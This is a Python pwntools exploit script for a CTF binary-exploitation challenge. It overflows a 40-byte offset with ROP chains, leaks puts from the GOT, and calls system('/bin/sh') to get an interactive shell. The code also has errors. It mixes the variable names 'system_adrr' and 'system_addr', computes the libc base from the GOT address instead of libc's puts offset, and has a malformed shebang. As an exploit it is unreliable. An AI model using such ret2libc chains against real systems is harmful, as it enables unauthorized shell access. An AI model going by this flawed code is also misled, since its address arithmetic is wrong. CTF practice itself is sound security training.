#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local=True
if(local):
    io = process(exe)
else:
    io = remote('ret2libc-pwn.wanictf.org', 9007)

# =========================================================
#                         ADDRESSES
# =========================================================
rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
libc = ELF('./libc.so.6')

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

# flattening  payload here
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main
    ]
})

# send 1st payload to get puts offset
io.sendlineafter(b'your input (max. 128 bytes) > ', payload)

# indexing to save puts addr offset in hex form 
got_puts = unpack(io.recvline()[:6].ljust(8, b'\x00'))
info('leaked got_puts: %#x', got_puts)

# obtained manually using $ readelf -s libc.so.6 | grep puts
libc_base = got_puts - elf.got.puts
info('libc_base: %#x', libc_base)

system_adrr = libc.symbols.system + libc_base
info('system_addr: %#x', system_addr)

binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
info('binsh: %#x', binsh)

# 2nd payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        binsh,
        ret,
        system_addr
    ]
})

# send 2nd payload to get shell
io.sendlineafter(b'your input (max. 128 bytes) > ', payload)

io.interactive()